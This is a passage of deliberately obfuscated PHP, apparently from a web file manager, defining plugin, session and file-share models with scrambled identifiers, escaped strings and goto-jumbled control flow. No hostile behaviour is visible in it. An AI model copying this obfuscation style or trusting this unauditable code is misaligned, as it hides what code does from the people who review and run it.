= IO::info($this->pathParse[$B¡Œƒ¬˜˜‘[76]]); if (!$CòÓ¹°’¯‡) { return array(); } goto A†ÈÆ‰Ç« ; EÆÕ†±áÙ: } } goto EÔ¿¤ì•¼; Bèêö×­íË: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\160\x6c\x75\x67\151\156\x4c\x69\163\164"; public $field = array("\156\x61\155\x65", "\x73\164\141\x74\165\x73", "\x72\145\x67\x69\145\x73\164", "\143\157\156\x66\151\147"); public function loadList($DÌÔæ²´è = false) { $c²Ö“—š·ƒ = array_to_keyvalue($this->listData(), $_SERVER[‘®…¢À][28]); if ($DÌÔæ²´è) { return $c²Ö“—š·ƒ[$DÌÔæ²´è]; } return $c²Ö“—š·ƒ; } public function init() { $f«¶âŒ‘“ =& $_SERVER[‘®…¢À]; Hook::trigger($f«¶âŒ‘“[2090]); $cì‚’‡°´Ã = $this->loadPluginList(); foreach ($cì‚’‡°´Ã as $bİâÇ‹êã => $dœ è…ªš¥) { $Aèğ„…˜« = $this->appAllow($bİâÇ‹êã, $dœ è…ªš¥); if (!$Aèğ„…˜«) { continue; } foreach ($dœ è…ªš¥[$f«¶âŒ‘“[2091]] as $C§£‹ùÃ¥Ğ => $F›‚÷éÏ½º) { Hook::bind($C§£‹ùÃ¥Ğ, $F›‚÷éÏ½º); } } Hook::trigger($f«¶âŒ‘“[2092]); Hook::trigger(ACTION); } public function appAllow($f¬¿×Íš´, $dëÇÆÌ‚“, $c‘İ«ó¸ùñ = true) { $dğç‚”œ¼Š =& $_SERVER[‘®…¢À]; $CÆ‡ã¦êƒ— = PLUGIN_DIR . $f¬¿×Íš´ . $dğç‚”œ¼Š[2093]; if (!is_array($dëÇÆÌ‚“) || !is_array($dëÇÆÌ‚“[$dğç‚”œ¼Š[2091]]) || !is_file($CÆ‡ã¦êƒ—) || $dëÇÆÌ‚“[$dğç‚”œ¼Š[662]] != 1) { return !1; } if ($c‘İ«ó¸ùñ && !Action($dğç‚”œ¼Š[2094])->checkAuth($f¬¿×Íš´)) { return !1; } return !0; } public function unInstall($FÀìÓÕ¶ÕÃ) { $c¯Ï˜„ƒª =& $_SERVER[‘®…¢À]; $f”‡‘¶ñœé = $this->loadList($FÀìÓÕ¶ÕÃ); if (file_exists(PLUGIN_DIR . $FÀìÓÕ¶ÕÃ)) { Hook::apply($FÀìÓÕ¶ÕÃ . $c¯Ï˜„ƒª[2095]); } $this->remove($f”‡‘¶ñœé[$c¯Ï˜„ƒª[363]]); } public function changeStatus($C÷ôˆ“´¢ö, $bÇÛëİå£ô) { $Bå‹²äŠ¯ =& $_SERVER[‘®…¢À]; $a±‚çêÅÒ = $this->loadList($C÷ôˆ“´¢ö); if ($bÇÛëİå£ô) { Hook::apply($C÷ôˆ“´¢ö . $Bå‹²äŠ¯[2096]); } $this->update($a±‚çêÅÒ[$Bå‹²äŠ¯[363]], array($Bå‹²äŠ¯[2097] => $bÇÛëİå£ô)); } public function appRegist($d”òñöØİ, $fÙÊÊ‹Şà) { $bßäÈ‡ßòá =& $_SERVER[‘®…¢À]; $dö›Ôì¬£˜ = $this->loadList($d”òñöØİ); if ($dö›Ôì¬£˜) { $this->update($dö›Ôì¬£˜[$bßäÈ‡ßòá[363]], array($bßäÈ‡ßòá[2091] => $fÙÊÊ‹Şà)); } else { $aæÊ†Ú…ì¸ = array($bßäÈ‡ßòá[28] => $d”òñöØİ, $bßäÈ‡ßòá[2091] => $fÙÊÊ‹Şà, $bßäÈ‡ßòá[662] => 0, $bßäÈ‡ßòá[6] => $this->getConfigDefault($d”òñöØİ)); $this->insert($aæÊ†Ú…ì¸); } } public function getConfigDefault($BÉŠª¥ğ˜‡) { $dÃ¡«³øøî =& $_SERVER[‘®…¢À]; $dßö÷ï¼Ë = array(); $DâÍË§¤å = $this->getPackageJson($BÉŠª¥ğ˜‡); if (!$DâÍË§¤å && is_array($DâÍË§¤å[$dÃ¡«³øøî[2098]])) { return $dßö÷ï¼Ë; } foreach ($DâÍË§¤å[$dÃ¡«³øøî[2098]] as $E¬åøßÅ => $f¹µ”ÅóÍí) { if (!isset($f¹µ”ÅóÍí[$dÃ¡«³øøî[355]]) || isset($dßö÷ï¼Ë[$E¬åøßÅ])) { continue; } $dßö÷ï¼Ë[$E¬åøßÅ] = $f¹µ”ÅóÍí[$dÃ¡«³øøî[355]]; } return $dßö÷ï¼Ë; } public function getPackageJson($dÍ‘ÙÒÓÏ…) { return Hook::apply($dÍ‘ÙÒÓÏ… . $_SERVER[‘®…¢À][2099]); } public function getConfig($båß«¨Ã’, $C›Åš‚ù¯ = false) { $fß‘öàŒç¡ =& $_SERVER[‘®…¢À]; $bÇ…‡Ş¼Û = array(); $CâÊòŠŠÉ“ = $this->loadList($båß«¨Ã’); if ($CâÊòŠŠÉ“ && is_array($CâÊòŠŠÉ“[$fß‘öàŒç¡[6]])) { $bÇ…‡Ş¼Û = $CâÊòŠŠÉ“[$fß‘öàŒç¡[6]]; } if (!$bÇ…‡Ş¼Û || $C›Åš‚ù¯) { $bÇ…‡Ş¼Û = $this->getConfigDefault($båß«¨Ã’); } return $bÇ…‡Ş¼Û; } public function setConfig($F¨Ç„ÆÜÌ, $dõÈ™È’ªÏ = false) { goto eÙà‡õÚ¼; f×Æ’º÷: if ($dõÈ™È’ªÏ == !1) { $dõÈ™È’ªÏ = $this->getConfigDefault($F¨Ç„ÆÜÌ); } $C›Ì“À¬éÉ = $c”Ğ‘Çæ…[$D¯¿’Æ…¡[6]]; foreach ($dõÈ™È’ªÏ as $Aá¹Âíóµ => $Bˆçé¢Èñë) { $C›Ì“À¬éÉ[$Aá¹Âíóµ] = is_string($Bˆçé¢Èñë) ? trim($Bˆçé¢Èñë) : $Bˆçé¢Èñë; } goto F ÷Ùäíš©; F ÷Ùäíš©: $this->update($c”Ğ‘Çæ…[$D¯¿’Æ…¡[363]], array($D¯¿’Æ…¡[6] => $C›Ì“À¬éÉ)); goto fŠÚØŞ‘ÉŸ; eÙà‡õÚ¼: $D¯¿’Æ…¡ =& $_SERVER[‘®…¢À]; $c”Ğ‘Çæ… = $this->loadList($F¨Ç„ÆÜÌ); if (!$c”Ğ‘Çæ…) { return !1; } goto f×Æ’º÷; fŠÚØŞ‘ÉŸ: } public function viewList() { goto A©’á›òÜ; C¡óóÂÆ„À: $C»˜¦Á‚ò¯ = $this->loadPluginList(); $E…–ö±å÷ë = array(); foreach ($C»˜¦Á‚ò¯ as $B¸à÷µ“ï => $Eœ÷Ğ–«¯˜) { unset($Eœ÷Ğ–«¯˜[$aøŒ¥‘Ä½İ[2091]], $Eœ÷Ğ–«¯˜[$aøŒ¥‘Ä½İ[6]]); $fÚ¡×Ë¤Å = PLUGIN_DIR . $Eœ÷Ğ–«¯˜[$aøŒ¥‘Ä½İ[28]] . $aøŒ¥‘Ä½İ[2093]; if (!is_file($fÚ¡×Ë¤Å)) { continue; } $d¬Ç·’İ’ = Hook::apply($Eœ÷Ğ–«¯˜[$aøŒ¥‘Ä½İ[28]] . $aøŒ¥‘Ä½İ[2099]); if (is_array($d¬Ç·’İ’)) { $E…–ö±å÷ë[$B¸à÷µ“ï] = array_merge($Eœ÷Ğ–«¯˜, $d¬Ç·’İ’); } } goto F­¶®”ÚËé; A©’á›òÜ: $aøŒ¥‘Ä½İ =& $_SERVER[‘®…¢À]; $C»˜¦Á‚ò¯ = $this->loadList(); $this->pluginScan($C»˜¦Á‚ò¯); goto C¡óóÂÆ„À; F­¶®”ÚËé: return $E…–ö±å÷ë; goto Eãßˆê‰ƒ“; Eãßˆê‰ƒ“: } private function loadPluginList() { $fÛ«ğ«×Ê =& $_SERVER[‘®…¢À]; $F¿…¯Ğß‡ = $this->loadList(); if (strtolower(MOD) == $fÛ«ğ«×Ê[2100]) { $F¨Š¾ßù¦² = $F¿…¯Ğß‡; } else { $F¨Š¾ßù¦² = Hook::trigger($fÛ«ğ«×Ê[2101], $F¿…¯Ğß‡); if (!$F¨Š¾ßù¦²) { die; } } return $F¨Š¾ßù¦²; } private function pluginScan($eù„ØÆãÓ£) { $a‰ùŞ‹¼ƒ© =& $_SERVER[‘®…¢À]; recursion_dir(PLUGIN_DIR, $D¡¥Ñ„™ÏÚ, $aì™ÈæÀ´, 0); foreach ($D¡¥Ñ„™ÏÚ as $fñîÆ˜äŸ±) { $A†•³³§·Å = get_path_this($fñîÆ˜äŸ±); if (isset($eù„ØÆãÓ£[$A†•³³§·Å]) || !file_exists($fñîÆ˜äŸ± . $a‰ùŞ‹¼ƒ©[2102]) || !file_exists($fñîÆ˜äŸ± . $a‰ùŞ‹¼ƒ©[2093])) { continue; } Hook::apply($A†•³³§·Å . $a‰ùŞ‹¼ƒ©[2096]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\x6d\x5f\x73\145\163\x73\151\157\156"; public function get($BòÓÑ¯øô‚) { $f¶ïÙ¹éáÄ =& $_SERVER[‘®…¢À]; $a‡±Œ•å¶˜ = $this->where(array($f¶ïÙ¹éáÄ[2103] => $BòÓÑ¯øô‚))->find(); if (!is_array($a‡±Œ•å¶˜)) { return !1; } return $a‡±Œ•å¶˜[$f¶ïÙ¹éáÄ[665]]; } public function set($dñº¯ åä«, $aÕ¿ÎÏÃæ‘, $A‘¥ÓÉÚ® = 3600) { $b…àˆÀƒæö =& $_SERVER[‘®…¢À]; $b†ƒÔ¢ËŒ = array($b…àˆÀƒæö[2103] => $dñº¯ åä«, $b…àˆÀƒæö[2031] => $aÕ¿ÎÏÃæ‘, $b…àˆÀƒæö[2104] => $A‘¥ÓÉÚ® + time()); if (Session::get($b…àˆÀƒæö[2105])) { $b†ƒÔ¢ËŒ[$b…àˆÀƒæö[1337]] = Session::get($b…àˆÀƒæö[2105]); } else { $b†ƒÔ¢ËŒ[$b…àˆÀƒæö[1337]] = 0; } if ($this->get($dñº¯ åä«)) { return $this->where(array($b…àˆÀƒæö[2103] => $dñº¯ åä«))->save($b†ƒÔ¢ËŒ); } else { return $this->add($b†ƒÔ¢ËŒ, array(), !0); } } public function remove($B÷…ÌÜ÷) { return $this->where(array($_SERVER[‘®…¢À][2103] => $B÷…ÌÜ÷))->delete(); } public function clearTimeout() { return $this->where($_SERVER[‘®…¢À][2106] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\145"; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\x69\155\x65", "\164\x69\x6d\145", "\151\x6e\x73\145\162\x74\x2c\165\x70\x64\x61\x74\145", "\146\x75\156\143\x74\151\157\x6e"), array("\x63\162\145\141\x74\145\124\151\x6d\x65", "\x74\151\155\145", "\x69\156\163\145\x72\164", "\x66\165\156\143\164\x69\157\156"), array("\x6f\160\x74\151\x6f\x6e\x73", '', "\151\x6e\x73\x65\162\164\x2c\x75\x70\144\141\x74\145\54\163\145\x6c\x65\143\x74", "\x6a\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($eÛƒŠ¦›öò) { $BŠ¬Û¨¸ =& $_SERVER[‘®…¢À]; $C‚¡Ñ‹Ÿ£ˆ = isset($eÛƒŠ¦›öò[0]) ? $eÛƒŠ¦›öò[0] : !1; return array($BŠ¬Û¨¸[2107] => array(USER_ID, $BŠ¬Û¨¸[2108]), $BŠ¬Û¨¸[2069] => array($C‚¡Ñ‹Ÿ£ˆ, $BŠ¬Û¨¸[2109])); } protected function listSimple() { $d“ï¼‚£° = array($_SERVER[‘®…¢À][1337] => USER_ID); $fØ„à¥íÂæ = $this->field($this->fieldList)->where($d“ï¼‚£°)->select(); return $fØ„à¥íÂæ ? $fØ„à¥íÂæ : array(); } protected function getInfo($CòâàÍ„“ù, $dÍ‹¾Ì¨ÕÏ = false) { $b§î¨¬°İÉ =& $_SERVER[‘®…¢À]; if ($dÍ‹¾Ì¨ÕÏ) { return $this->_getShareInfo(array($b§î¨¬°İÉ[436] => $CòâàÍ„“ù)); } $B÷§ºòó£ = $this->cacheFunctionGet($b§î¨¬°İÉ[2110], $CòâàÍ„“ù); return $B÷§ºòó£; } public function getInfoByHash($e­·Ä¼¤®©) { return $this->_getShareInfo(array($_SERVER[‘®…¢À][438] => $e­·Ä¼¤®©)); } public function getInfoByPath($e•²É·ö„Æ) { $cç ©åÓóà =& $_SERVER[‘®…¢À]; $aÜÒ¡¡ŸÅè = array($cç ©åÓóà[1337] => USER_ID, $cç ©åÓóà[365] => $e•²É·ö„Æ); return $this->_getShareInfo($aÜÒ¡¡ŸÅè); } public function getInfoBySourcePath($e“…äæ¿) { $F„ëÁè¹„¡ =& $_SERVER[‘®…¢À]; $càæ»Úáºâ = array($F„ëÁè¹„¡[1337] => USER_ID, $F„ëÁè¹„¡[975] => $e“…äæ¿); return $this->_getShareInfo($càæ»Úáºâ); } private function _getShareInfo($AÕº­ñÔÊ) { goto E‚íï¿„Ä; dõù›„Î´¹: if ($F¹øÙªÉŸ¤[$C‡ÊÅêÈ‚[365]] == $C‡ÊÅêÈ‚[463]) { $F¹øÙªÉŸ¤[$C‡ÊÅêÈ‚[387]] = IO::info($F¹øÙªÉŸ¤[$C‡ÊÅêÈ‚[975]]); } else { $F¹øÙªÉŸ¤[$C‡ÊÅêÈ‚[387]] = Model($C‡ÊÅêÈ‚[1067])->pathInfo($F¹øÙªÉŸ¤[$C‡ÊÅêÈ‚[365]]); } $F¹øÙªÉŸ¤[$C‡ÊÅêÈ‚[2112]] = $Cí‰†İîœ; return $F¹øÙªÉŸ¤; goto Cê¢ÈÅ¹‹†; E‚íï¿„Ä: $C‡ÊÅêÈ‚ =& $_SERVER[‘®…¢À]; $F¹øÙªÉŸ¤ = $this->where($AÕº­ñÔÊ)->find(); if (!$F¹øÙªÉŸ¤) { return !1; } goto F«ŒÉŒÉâ†; F«ŒÉŒÉâ†: $AÕº­ñÔÊ = array($C‡ÊÅêÈ‚[436] => $F¹øÙªÉŸ¤[$C‡ÊÅêÈ‚[436]]); $A“½¦‰½È¬ = $C‡ÊÅêÈ‚[2111]; $Cí‰†İîœ = Model($C‡ÊÅêÈ‚[528])->order($C‡ÊÅêÈ‚[363])->field($A“½¦‰½È¬)->where($AÕº­ñÔÊ)->select(); goto dõù›„Î´¹; Cê¢ÈÅ¹‹†: } protected function getInfoAuth($fï¼ß¶¾§Â) { $DŠ’‰„º´ =& $_SERVER[‘®…¢À]; $Cö…èÊãí = $this->getInfo($fï¼ß¶¾§Â); $Cö…èÊãí[$DŠ’‰„º´[372]] = Model($DŠ’‰„º´[449])->authMake($Cö…èÊãí[$DŠ’‰„º´[2112]]); return $Cö…èÊãí; } protected function listData($bö˜Æ‚±ºô = null, $A½ÆùÉÌ¼ = 300) { $cìà®ğò«¹ =& $_SERVER[‘®…¢À]; $CæÎÅì„æô = array(array($cìà®ğò«¹[441] => array($cìà®ğò«¹[907], 0), $cìà®ğò«¹[443] => array($cìà®ğò«¹[907], 0), $cìà®ğò«¹[2113] => $cìà®ğò«¹[2082])); if ($bö˜Æ‚±ºô == $cìà®ğò«¹[1767]) { $CæÎÅì„æô = array($cìà®ğò«¹[441] => 1); } else { if ($bö˜Æ‚±ºô == $cìà®ğò«¹[964]) { $CæÎÅì„æô = array($cìà®ğò«¹[443] => 1); } } $CæÎÅì„æô[$cìà®ğò«¹[1337]] = USER_ID; $aŒ§İ“Ãå§ = $this->where($CæÎÅì„æô)->selectPage($A½ÆùÉÌ¼); return $aŒ§İ“Ãå§; } protected function listToMe($a‘‡†õ²î = 300) { goto Bïï³ìø·; aî¹µÌ’åí: $EË³âŠØé = array($eÇâ­ì®«‘[436] => array($eÇâ­ì®«‘[380], array_keys($A‚Å˜íÎ»))); $FˆÌè­¼á× = $this->field($B™í³† „Ö)->where($EË³âŠØé)->select(); foreach ($FˆÌè­¼á× as $cÊµëŞ®Ñ => &$aËµ†æ‹è) { $aËµ†æ‹è[$eÇâ­ì®«‘[2112]] = $A‚Å˜íÎ»[$aËµ†æ‹è[$eÇâ­ì®«‘[436]]]; } goto CÉÓÑ‰ÅªÄ; CÉÓÑ‰ÅªÄ: $dçğÀöÇŒæ = array($eÇâ­ì®«‘[2116] => $FˆÌè­¼á×, $eÇâ­ì®«‘[2117] => $Aï†„Ö›ÍŒ[$eÇâ­ì®«‘[347]]); return $dçğÀöÇŒæ; goto B²–ñ‚ĞÄ; a¡ áé¶ùª: $EË³âŠØé = array($eÇâ­ì®«‘[512] => SourceModel::TYPE_USER, $eÇâ­ì®«‘[451] => USER_ID); if ($EëÒÌöÜİÒ) { $EË³âŠØé = array(array($eÇâ­ì®«‘[512] => SourceModel::TYPE_USER, $eÇâ­ì®«‘[451] => USER_ID), array($eÇâ­ì®«‘[512] => SourceModel::TYPE_GROUP, $eÇâ­ì®«‘[451] => array($eÇâ­ì®«‘[7], $EëÒÌöÜİÒ)), $eÇâ­ì®«‘[2113] => $eÇâ­ì®«‘[2082]); } $Aï†„Ö›ÍŒ = Model($eÇâ­ì®«‘[528])->where($EË³âŠØé)->selectPage($a‘‡†õ²î); goto FŠµØ‚‹ã; Bïï³ìø·: $eÇâ­ì®«‘ =& $_SERVER[‘®…¢À]; $cº¡çïø´§ = Session::get($eÇâ­ì®«‘[2114]); $EëÒÌöÜİÒ = array_to_keyvalue($cº¡çïø´§, $eÇâ­ì®«‘[33], $eÇâ­ì®«‘[2000]); goto a¡ áé¶ùª; FŠµØ‚‹ã: $A‚Å˜íÎ» = array_to_keyvalue_group($Aï†„Ö›ÍŒ[$eÇâ­ì®«‘[350]], $eÇâ­ì®«‘[436]); if (!$A‚Å˜íÎ») { return $Aï†„Ö›ÍŒ; } $B™í³† „Ö = $eÇâ­ì®«‘[2115]; goto aî¹µÌ’åí; B²–ñ‚ĞÄ: } protected function shareAdd($cÀê ¸©æ“, $BÔ»ÔŒˆŒ) { $d¾‘Î½âí” =& $_SERVER[‘®…¢À]; $e¦÷‹í± = $this->_addShareData($cÀê ¸©æ“, $BÔ»ÔŒˆŒ); if (!empty($BÔ»ÔŒˆŒ[$d¾‘Î½âí”[2118]])) { $this->_shareAuthSet($e¦÷‹í±, $BÔ»ÔŒˆŒ[$d¾‘Î½âí”[2118]]); } $this->shareEventAdd($cÀê ¸©æ“, $BÔ»ÔŒˆŒ, $d¾‘Î½âí”[967]); return $e¦÷‹í±; } private function shareEventAdd($aÇ’ßµã‰‘, $b†¸—Ú•ƒß, $a‰êòèß« = "\141\144\x64") { goto fÜ¥«Œ…Úˆ; fÜ¥«Œ…Úˆ: $a¨é‚â•¤ =& $_SERVER[‘®…¢À]; if ($a‰êòèß« == $a¨é‚â•¤[967]) { if ($b†¸—Ú•ƒß[$a¨é‚â•¤[441]] == $a¨é‚â•¤[84]) { Model($a¨é‚â•¤[496])->eventShare($aÇ’ßµã‰‘, $a¨é‚â•¤[2119]); } if ($b†¸—Ú•ƒß[$a¨é‚â•¤[443]] == $a¨é‚â•¤[84]) { Model($a¨é‚â•¤[496])->eventShare($aÇ’ßµã‰‘, $a¨é‚â•¤[2120]); } return; } $F²º‹ËÈ†Ë = $this->getInfoByPath($aÇ’ßµã‰‘); goto föğµ®‚; cèäö ãï: return; goto eÛ¦‰ŸçÙ¢; CùóÑ¯“•Š: if ($F²º‹ËÈ†Ë[$a¨é‚â•¤[443]] == $a¨é‚â•¤[463] && $b†¸—Ú•ƒß[$a¨é‚â•¤[443]] == $a¨é‚â•¤[84]) { $F©î½¶·À = $a¨é‚â•¤[2120]; } if ($F²º‹ËÈ†Ë[$a¨é‚â•¤[443]] == $a¨é‚â•¤[84] && $b†¸—Ú•ƒß[$a¨é‚â•¤[443]] == $a¨é‚â•¤[463]) { $F©î½¶·À = $a¨é‚â•¤[2123]; } Model($a¨é‚â•¤[496])->eventShare($aÇ’ßµã‰‘, $F©î½¶·À); goto cèäö ãï; föğµ®‚: $F©î½¶·À = $a¨é‚â•¤[2121]; if ($F²º‹ËÈ†Ë[$a¨é‚â•¤[441]] == $a¨é‚â•¤[463] && $b†¸—Ú•ƒß[$a¨é‚â•¤[441]] == $a¨é‚â•¤[84]) { $F©î½¶·À = $a¨é‚â•¤[2119]; } if ($F²º‹ËÈ†Ë[$a¨é‚â•¤[441]] == $a¨é‚â•¤[84] && $b†¸—Ú•ƒß[$a¨é‚â•¤[441]] == $a¨é‚â•¤[463]) { $F©î½¶·À = $a¨é‚â•¤[2122]; } goto CùóÑ¯“•Š; eÛ¦‰ŸçÙ¢: } private function _addShareData($a§˜Áäƒ‹, $bªö†Ì¥ = array()) { goto fø¡Ã‹Ù‡Ã; CäôË‘Õ¸Ÿ: $B›—ñÛ˜º = array($DÜóŒõ‘ƒ[1328] => USER_ID, $DÜóŒõ‘ƒ[379] => $a§˜Áäƒ‹, $DÜóŒõ‘ƒ[1234] => $DÜóŒõ‘ƒ[33], $DÜóŒõ‘ƒ[441] => 0, $DÜóŒõ‘ƒ[443] => 0, $DÜóŒõ‘ƒ[975] => $DÜóŒõ‘ƒ[33], $DÜóŒõ‘ƒ[292] => $DÜóŒõ‘ƒ[33], $DÜóŒõ‘ƒ[782] => $DÜóŒõ‘ƒ[33], $DÜóŒõ‘ƒ[2125] => 0, $DÜóŒõ‘ƒ[2126] => 0, $DÜóŒõ‘ƒ[676] => 0, $DÜóŒõ‘ƒ[2127] => $DÜóŒõ‘ƒ[33], $DÜóŒõ‘ƒ[438] => $DÜóŒõ‘ƒ[33]); $FŠğ’„´¨ã = explode($DÜóŒõ‘ƒ[47], $DÜóŒõ‘ƒ[2128]); foreach ($FŠğ’„´¨ã as $EŠÇ¾ŒàË) { if (!isset($bªö†Ì¥[$EŠÇ¾ŒàË])) { continue; } $B›—ñÛ˜º[$EŠÇ¾ŒàË] = $bªö†Ì¥[$EŠÇ¾ŒàË]; } goto fºôÍ½µ‘¤; dÀâİŠÃ°: if ($B—Â†Œ´ÛË = $this->where($A¼„Ë›Àô)->find()) { return $B—Â†Œ´ÛË[$DÜóŒõ‘ƒ[436]]; } if ($a§˜Áäƒ‹ == 0) { $Fù„¿†„ŠÅ = array($DÜóŒõ‘ƒ[28] => get_path_this($bªö†Ì¥[$DÜóŒõ‘ƒ[76]])); } else { $Fù„¿†„ŠÅ = Model($DÜóŒõ‘ƒ[735])->sourceInfo($a§˜Áäƒ‹); if (!$Fù„¿†„ŠÅ) { return !1; } } if (!$bªö†Ì¥[$DÜóŒõ‘ƒ[1234]]) { $bªö†Ì¥[$DÜóŒõ‘ƒ[1234]] = $Fù„¿†„ŠÅ[$DÜóŒõ‘ƒ[28]]; } goto CäôË‘Õ¸Ÿ; fø¡Ã‹Ù‡Ã: $DÜóŒõ‘ƒ =& $_SERVER[‘®…¢À]; $A¼„Ë›Àô = array($DÜóŒõ‘ƒ[379] => $a§˜Áäƒ‹, $DÜóŒõ‘ƒ[1328] => USER_ID); if ($a§˜Áäƒ‹ == 0) { $A¼„Ë›Àô = array($DÜóŒõ‘ƒ[2124] => $bªö†Ì¥[$DÜóŒõ‘ƒ[975]], $DÜóŒõ‘ƒ[1328] => USER_ID); } goto dÀâİŠÃ°; fºôÍ½µ‘¤: $Eô¦“Ÿ„“ = $this->add($B›—ñÛ˜º); $Dğï»Òñ¾” = array($DÜóŒõ‘ƒ[438] => short_id($Eô¦“Ÿ„“)); $this->where(array($DÜóŒõ‘ƒ[435] => $Eô¦“Ÿ„“))->save($Dğï»Òñ¾”); goto cÁâõ‹Éœ‹; cÁâõ‹Éœ‹: return $Eô¦“Ÿ„“; goto eçáÌ¤è¬¥; eçáÌ¤è¬¥: } private function _shareAuthSet($Fòéàî½ÏÜ, $A¯»‹¤) { goto bÈåçÄÉ; EöÑÈí™‚´: return $dÅÜËš³Œ¢->addAll($Bà¬´Ô‰¶¤, array(), !0); goto aòĞôÎÑÏ·; d¤ÃêÁ¨‡¡: $dÅÜËš³Œ¢->where(array($dÓŠìö²ğô[436] => $Fòéàî½ÏÜ))->delete(); $Bà¬´Ô‰¶¤ = array(); foreach ($A¯»‹¤ as $a…†·ÕÚ¿Š) { $F¬ó÷…Î‚• = SourceModel::TYPE_USER; if ($a…†·ÕÚ¿Š[$dÓŠìö²ğô[367]] == SourceModel::TYPE_GROUP) { $F¬ó÷…Î‚• = SourceModel::TYPE_GROUP; } $a“¾›ò²Æ = array($dÓŠìö²ğô[436] => $Fòéàî½ÏÜ, $dÓŠìö²ğô[367] => $F¬ó÷…Î‚•, $dÓŠìö²ğô[451] => intval($a…†·ÕÚ¿Š[$dÓŠìö²ğô[451]]), $dÓŠìö²ğô[2130] => 0, $dÓŠìö²ğô[2131] => -1); if ($a…†·ÕÚ¿Š[$dÓŠìö²ğô[2130]]) { $a“¾›ò²Æ[$dÓŠìö²ğô[2130]] = $a…†·ÕÚ¿Š[$dÓŠìö²ğô[2130]]; } else { if ($a…†·ÕÚ¿Š[$dÓŠìö²ğô[2131]]) { $a“¾›ò²Æ[$dÓŠìö²ğô[2131]] = $a…†·ÕÚ¿Š[$dÓŠìö²ğô[2131]]; } } $Bà¬´Ô‰¶¤[] = $a“¾›ò²Æ; } goto EöÑÈí™‚´; bÈåçÄÉ: $dÓŠìö²ğô =& $_SERVER[‘®…¢À]; if (!is_array($A¯»‹¤)) { return !1; } $dÅÜËš³Œ¢ = Model($dÓŠìö²ğô[2129]); goto d¤ÃêÁ¨‡¡; aòĞôÎÑÏ·: } public function numViewAdd($E†ôËËô‰) { $EÜÎ»ŠóŸ’ =& $_SERVER[‘®…¢À]; $C—´Áİ˜Ï£ = array($EÜÎ»ŠóŸ’[435] => $E†ôËËô‰); $this->where($C—´Áİ˜Ï£)->setAdd($EÜÎ»ŠóŸ’[2125]); } public function numDownloadAdd($aœ‘‘âğº) { $Cµ¯ß‹ÑÛ— =& $_SERVER[‘®…¢À]; $DøˆàÀŒñ‡ = array($Cµ¯ß‹ÑÛ—[435] => $aœ‘‘âğº); $this->where($DøˆàÀŒñ‡)->setAdd($Cµ¯ß‹ÑÛ—[2126]); } protected function shareEdit($döÒ êíä™, $fê‡îºèŒÙ) { goto EÚá—’Î–ó; EÚá—’Î–ó: $D¢ÛĞëĞÎ˜ =& $_SERVER[‘®…¢À]; $Fœ‡İº ® = $this->getInfo($döÒ êíä™); if (!$Fœ‡İº ®) { return !1; } goto cïø™¸È¶‘; C²ã­Ûİ©Ö: if (isset($fê‡îºèŒÙ[$D¢ÛĞëĞÎ˜[2118]])) { $this->_shareAuthSet($döÒ êíä™, $fê‡îºèŒÙ[$D¢ÛĞëĞÎ˜[2118]]); } return !0; goto e¤ËÚŞªš¶; cïø™¸È¶‘: $this->_checkLinkShare($fê‡îºèŒÙ, $Fœ‡İº ®); $f–µ¢ÂÈñê = array(); $aÖêÚùÍ‚á = explode($D¢ÛĞëĞÎ˜[47], $D¢ÛĞëĞÎ˜[2132]); goto D¼¡˜‰ Ê‰; D¼¡˜‰ Ê‰: foreach ($aÖêÚùÍ‚á as $E·¡ïÂ® Á) { if (!array_key_exists($E·¡ïÂ® Á, $fê‡îºèŒÙ)) { continue; } $f–µ¢ÂÈñê[$E·¡ïÂ® Á] = $fê‡îºèŒÙ[$E·¡ïÂ® Á]; } $this->shareEventAdd($Fœ‡İº ®[$D¢ÛĞëĞÎ˜[365]], $fê‡îºèŒÙ, $D¢ÛĞëĞÎ˜[1969]); $this->where(array($D¢ÛĞëĞÎ˜[435] => $döÒ êíä™))->save($f–µ¢ÂÈñê); goto C²ã­Ûİ©Ö; e¤ËÚŞªš¶: } private function _checkLinkShare($e¨¹‹¹Ø, $f´ÍÓÍôˆ) { $DèÆ÷ÕøÉ¼ =& $_SERVER[‘®…¢À]; if ($e¨¹‹¹Ø[$DèÆ÷ÕøÉ¼[441]] != $DèÆ÷ÕøÉ¼[84] || $f´ÍÓÍôˆ[$DèÆ÷ÕøÉ¼[387]][$DèÆ÷ÕøÉ¼[29]] != $DèÆ÷ÕøÉ¼[164]) { return; } $c—áğ‘ß³ = Model($DèÆ÷ÕøÉ¼[735])->fileInfoGet($f´ÍÓÍôˆ[$DèÆ÷ÕøÉ¼[387]][$DèÆ÷ÕøÉ¼[365]]); if (!$c—áğ‘ß³) { return; } $DòºêÀ„º“ = $this->shareFileMeta($c—áğ‘ß³[$DèÆ÷ÕøÉ¼[414]]); if (isset($DòºêÀ„º“[$DèÆ÷ÕøÉ¼[355]]) && $DòºêÀ„º“[$DèÆ÷ÕøÉ¼[355]] == $DèÆ÷ÕøÉ¼[84]) { show_json(LNG($DèÆ÷ÕøÉ¼[2133]), !1); } } protected function remove($A‚õØ„ÁŒ) { goto cŞóÅºñÍÚ; d¾ôº‰»Ö“: $E‰Øœ‰¿‚ = $this->where($A¶™ùŞˆïˆ)->delete(); if ($E‰Øœ‰¿‚) { Model($CêøĞê‡÷[528])->where(array($CêøĞê‡÷[436] => $A‚õØ„ÁŒ))->delete(); } $e†–¼‚¬± = is_array($A‚õØ„ÁŒ) ? $A‚õØ„ÁŒ[1] : array($A‚õØ„ÁŒ); goto EÕóá«Ã«Ğ; EÕóá«Ã«Ğ: for ($D¶Ü½êÒ‚œ = 0; $D¶Ü½êÒ‚œ < count($e†–¼‚¬±); $D¶Ü½êÒ‚œ++) { $e¶Â®»‡ = $this->getInfo($e†–¼‚¬±[$D¶Ü½êÒ‚œ]); if ($e¶Â®»‡[$CêøĞê‡÷[443]] == $CêøĞê‡÷[84]) { Model($CêøĞê‡÷[496])->eventShare($e¶Â®»‡[$CêøĞê‡÷[365]], $CêøĞê‡÷[2123]); } if ($e¶Â®»‡[$CêøĞê‡÷[441]] == $CêøĞê‡÷[84]) { Model($CêøĞê‡÷[496])->eventShare($e¶Â®»‡[$CêøĞê‡÷[365]], $CêøĞê‡÷[2122]); } } return $E‰Øœ‰¿‚; goto Dî¶‹¼¤Ö; 